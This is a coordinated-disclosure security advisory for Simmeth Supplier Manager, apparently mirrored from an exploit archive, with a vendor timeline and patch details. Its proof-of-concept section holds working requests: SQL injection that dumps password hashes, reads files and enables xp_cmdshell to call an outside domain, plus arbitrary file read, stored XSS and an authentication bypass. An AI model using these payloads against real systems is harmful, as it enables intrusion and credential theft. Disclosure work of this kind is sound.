@@ -1,0 +1,409 @@
+id: 38066
+date: 11/16/2022
+title: Simmeth System GmbH Supplier Manager LFI / SQL Injection / Bypass Vulnerabilities
+author: Steffen Robertz
+cves: CVE-2022-44012, CVE-2022-44013, CVE-2022-44014, CVE-2022-44015, CVE-2022-44016, CVE-2022-44017
+
+=======================================================================
+               title: Multiple Critical Vulnerabilities
+             product: Simmeth System GmbH Supplier manager (Lieferantenmanager)
+  vulnerable version: < 5.6
+       fixed version: 5.6
+          CVE number: CVE-2022-44012, CVE-2022-44013, CVE-2022-44014,
+                      CVE-2022-44015, CVE-2022-44016, CVE-2022-44017
+              impact: critical
+            homepage: https://www.simmeth.net
+               found: 2022-03-01
+                  by: Steffen Robertz (Office Vienna)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"We are an innovative B2B software provider for supply chain management,
+especially in the areas of supplier management over the entire supplier
+lifecycle and quality control, supply chain key figures and reporting.
+
+Our medium-sized family business is a reliable, practice-oriented partner with
+an extraordinary wealth of experience: since 2002, our currently more than 70
+medium-sized and corporate customers have trusted our solutions and our
+pragmatically oriented expertise."
+
+Source: https://www.simmeth.net/en/company/about-us
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch which should be installed immediately.
+
+An in-depth security analysis performed by security professionals is
+highly advised, to identify and resolve potential further critical security
+issues.  
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) SQL Injection leading to Remote Code Execution (CVE-2022-44015)
+An attacker can inject raw SQL queries. By activating MSSQL features, the
+attacker is able to execute arbitrary commands on the MSSQL server.
+
+2) Faulty API Design (CVE-2022-44014)
+A faulty API design allows an attacker to fetch arbitrary SQL tables per
+design. This will leak all user passwords and MSSQL hashes.
+
+3) Local File Access (CVE-2022-44016)
+An attacker can download arbitrary files from the web server by abusing an API
+call.
+
+4) Leak of Simmeth's SMTP password
+A cleartext password for the email account "LM@simmeth.net" is leaked during
+the login process.
+
+5) Stored Cross-Site Scripting (CVE-2022-44012)
+An attacker can execute JavaScript code in the browser of the victim if a site
+is loaded. The victim's encrypted password can be stolen and most likely be
+decrypted.
+
+6) Authentication Bypass (CVE-2022-44013)
+An attacker can access multiple API calls without authentication. Thus, all
+outlined attacks can be executed without knowing any valid credentials.
+
+7) Errors in Session management (CVE-2022-44017)
+Due to errors in the session management, an attacker can log back into a
+victim's account after the victim logged out. This is due to the credentials not
+being cleaned from the local storage after logout.
+
+8) Information Disclosure
+Multiple requests were giving verbose error messages. This helps an attacker in
+finding and abusing a vulnerability.
+
+
+Proof of concept:
+-----------------
+1) SQL Injection leading to Remote Code Execution (CVE-2022-44015)
+Following API call can be used to execute arbitrary SQL queries via a subquery
+or stacked query in the table name. Because of vulnerability 6, only a valid
+username is required to send the request.
+
+---------------------------------
+POST /DS/LM_API/api/SelectionService/GetPaggedTab HTTP/1.1
+Content-Length: 1264
+[...]
+
+{
+   "Credential": {
+     "Mandant": {
+       "ConfigPath": "C:\\SSG\\50_Konfigurationen\\LM.xml",
+       "ConnectionString": {
+         "Available": false,
+         "System": "****"
+       },
+       "Encryption": 1,
+       "IsWithRegistration": true,
+       "Name": "****"
+     },
+     "Username": "simmeth",
+     "System": "****"
+   },
+   "ResultTab": {
+     "AutoLoad": false,
+     "Createable": true,
+     "Databases": [
+       {
+         "System": "****",
+         "Tables": [
+           {
+             "Columns": [],
+             "Name": "(SELECT name, password_hash FROM master.sys.sql_logins)sub;--",
+             "Relations": [],
+             "Results": [
+               {
+                 "ColumnName": "*"
+               }
+             ]
+           }
+         ]
+       }
+     ],
+     "Name": "Results",
+     "PageSize": 2000
+   },
+   "Ids": {},
+   "SecondaryIds": {},
+   "Constraints": [],
+   "DateConstraints": {},
+   "LogicOperator": 0,
+   "PageNumber": 0,
+   "Sortings": {},
+   "TableFilters": {},
+   "GroupByField": null,
+   "Aggregates": {},
+   "isExport": false
+}
+
+-------------------
+The POC above shows an example subquery, which will respond with the resulting
+dataset. Stacked queries will be executed, however, the results will not be
+contained in the web server's reply. The example query will dump the MSSQL password
+hashes.
+
+Further attacks include arbitrary file read with the following query:
+
+(SELECT * FROM OPENROWSET(BULK N'c:/windows/system32/license.rtf', SINGLE_CLOB) AS Contents
+)sub;--
+
+And code execution via the xp_cmdshell extended procedure:
+
+(SELECT @@Version AS version )sub; EXEC ('sp_configure ''show advanced options'', 1;
+RECONFIGURE;'); EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;');EXEC xp_cmdshell
+'nslookup some.domain';--
+
+
+2) Faulty API Design (CVE-2022-44014)
+The API design allows the frontend to supply an arbitrary table name
+(called <TABLE NAME HERE> in the POC below) into the following request.
+Because of vulnerability 6, only a valid username is required to send the
+request.
+
+---------------------------------
+POST /DS/LM_API/api/SelectionService/GetPaggedTab HTTP/1.1
+Content-Length: 1264
+[...]
+
+{
+   "Credential": {
+     "Mandant": {
+       "ConfigPath": "C:\\SSG\\50_Konfigurationen\\LM.xml",
+       "ConnectionString": {
+         "Available": false,
+         "System": "****"
+       },
+       "Encryption": 1,
+       "IsWithRegistration": true,
+       "Name": "****"
+     },
+     "Username": "simmeth",
+     "System": "****"
+   },
+   "ResultTab": {
+     "AutoLoad": false,
+     "Createable": true,
+     "Databases": [
+       {
+         "System": "****",
+         "Tables": [
+           {
+             "Columns": [],
+             "Name": "<TABLE NAME HERE>",
+             "Relations": [],
+             "Results": [
+               {
+                 "ColumnName": "*"
+               }
+             ]
+           }
+         ]
+       }
+     ],
+     "Name": "Results",
+     "PageSize": 2000
+   },
+   "Ids": {},
+   "SecondaryIds": {},
+   "Constraints": [],
+   "DateConstraints": {},
+   "LogicOperator": 0,
+   "PageNumber": 0,
+   "Sortings": {},
+   "TableFilters": {},
+   "GroupByField": null,
+   "Aggregates": {},
+   "isExport": false
+}
+
+-------------------
+
+This is a fault by design, as the attacker has full control of the table
+name. Therefore, an arbitrary table such as the user table
+(ACL_Benutzer_Admin_Einkauf and ACL_Benutzer) can be read.
+
+
+3) Local File Access (CVE-2022-44016)
+The "GetImages" API call can be abused to read arbitrary files from the file
+system. This is due to the API allowing to set the image path from the
+frontend.
+
+By pointing the base path to C:\, all files can be accessed.
+Because of vulnerability 6, the request requires no credentials.
+
+-----------------------
+POST /DS/LM_API/api/ConfigurationService/GetImages HTTP/1.1
+Content-Length: 229
+[...]
+
+{"Credential":{
+"Mandant":{
+"ConfigPath":"C:\\SSG\\50_Konfigurationen\\LM.xml"
+},
+},
+"ImagesPath":"C:\\",
+"ListImageNames":[
+         "Windows\\win.ini",
+         "boot.ini",
+         "Windows\\system32\\eula.txt",
+         "Windows\\System32\\drivers\\etc\\hosts"
+]
+}
+--------------------
+The files are returned base64 encoded. Thus, even binary data can be extracted
+from the server.
+
+
+4) Leak of Simmeth's SMTP password
+The following API call will return the current configuration. The configuration
+seems to contain cleartext credentials from Simmeth's SMTP server. The
+request does not require any credentials.
+
+-----------------
+POST /DS/LM_API/api/ConfigurationService/GetConfiguration HTTP/1.1
+Content-Length: 70
+Content-Type: application/json
+
+
+{
+"Mandant":{"ConfigPath":"C:\\SSG\\50_Konfigurationen\\LM.xml",}
+}
+----------------
+
+The server responds with:
+
+---------------
+[...]
+"KPIIntro":{
+"IsAccessLog":true,
+"MailSettings":{
+"Host":"vwp4261.webpack.hosteurope.de",
+"IsAuthentification":true,
+"IsSSL":false,
+"LoginName":"wp10481666-supply",
+"Password":"K***********a",
+"Port":"25",
+"Sender":"LM@simmeth.net"
+[...]
+--------------
+Thus, an attacker could send phishing mails from an official Simmeth account.
+
+
+5) Stored Cross-Site Scripting (CVE-2022-44012)
+The following request can be used to store JavaScript code into the database. It
+will be fetched and executed in the victim's browser, once the site is visited.
+Because of vulnerability 6, only a valid username is required to send the request.
+
+--------------
+POST /DS/LM_API/api/SelectionService/InsertQueryWithActiveRelationsReturnId HTTP/1.1
+Content-Length: 3311
+
+{"Credential":{"Mandant":{"ConfigPath":"C:\\SSG\\50_Konfigurationen\\LM.xml","ConnectionString
+":{"Available":false,"System":"****"},"Encryption":1,"IsWithRegistration":true,"Name":"****"},
+"Username":"********","System":"****"},"TabName":"Lieferzeiten","System":"****","TableName"
+:"Lieferzeiten","Columns":{"Artikel":"test","Lieferzeit":"test1","Bemerkung":"<img src=x
+onerror=alert(document.domain)>test","Lie_ID":4167},
+[...]
+---------------
+
+The XSS can be used to steal the encrypted passwords from the local storage.
+As the API uses cleartext passwords with every request, it is most likely
+possible to exfiltrate the passwords in cleartext as well.
+
+
+6) Authentication Bypass (CVE-2022-44013)
+All API calls start by supplying the Credential Object.
+----------------
+"Credential": {
+     "Mandant": {
+       "ConfigPath": "C:\\SSG\\50_Konfigurationen\\LM.xml",
+       "ConnectionString": {
+         "Available": false,
+         "System": "****"
+       },
+       "Encryption": 1,
+       "IsWithRegistration": true,
+       "Name": "****"
+     },
+     "Username": "simmeth",
+     "Password: "*********"
+     "System": "****"
+   },
+
+----------------
+However, the password can just be removed. It seems to be only checked on the
+login API call. Thus, all requests can be made with just a username. The tested
+environment contained a User called "simmeth".
+Most likely this is a default user and thus always available, lowering the
+requirements for authenticated requests even further.
+
+
+7) Errors in Session management (CVE-2022-44017)
+An attacker can abuse a session management vulnerability in order to log back
+into a user account after the user logged out.
+The encrypted password and username saved in the local storage of the
+web browser is not cleared on logout and always stays valid. Hence, only the state
+of the frontend state changes and the user appears to be logged out.
+An attacker can force the frontend state back into the logged in state by
+visiting: https://<your-host>/LMS/LM/#main
+
+
+8) Information Disclosure
+The application replies with verbose error messages, when triggering
+exceptions. This can help an attacker to gain knowledge about the backend and
+aid in the development of exploits.
+Entering e.g. a single apostrophe into the table name of vulnerability 2 will
+cause the web server to print a full stack trace as well as the rest of the SQL
+query. Hence, the SQL statement can easily be updated to execute properly.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The test was conducted in version 5.4 which was found to be vulnerable.
+
+
+Vendor contact timeline:
+------------------------
+2022-04-01: Contacting vendor through info@simmeth.net
+2022-04-01: Simmeth requested to know in which customer's environment the
+             vulnerabilities were discovered.
+2022-04-04: SEC Consult's customer agreed to disclose their company name to Simmeth.
+2022-04-04: Simmeth claims that a new version has been deployed on 18.03.2022 and already
+             contains fixes. SEC Consult requests the version number of the fixed version.
+2022-04-06: Simmeth communicates the fixed version numbers, advisory is being sent per
+             unencrypted email.
+2022-04-07: Simmeth will verify if all vulnerabilities are already fixed.
+2022-04-20: Requested status. Vendor replies that our vulnerabilities are different/new
+             and currently being fixed.
+2022-04-25: Simmeth states that they will require two weeks to fix the vulnerabilities.
+             A new API will be created until the end of the year.
+2022-06-08: Simmeth sends changelog and states that all vulnerabilities have been fixed.
+2022-06-13: Asking regarding CVE numbers, Simmeth states that patching customers will take
+             until end of July.
+2022-09-02: Asking about CVE numbers and if all customers are patched.
+2022-09-05: Some customers are not yet patched. Current version is phased out by the
+             end of september. All customers will have to upgrade until then. SEC Consult
+             will request CVE numbers.
+2022-10-05: Requested status update.
+2022-10-17: All customers are updated.
+2022-11-09: Coordinated release of security advisory.
+
+
+Solution:
+---------
+The vendor provides a patched version 5.6 which fixes the identified
+security issues. Please approach your vendor support contact in order to receive
+the patches.
+
+#  0day.today [2023-03-24]  #
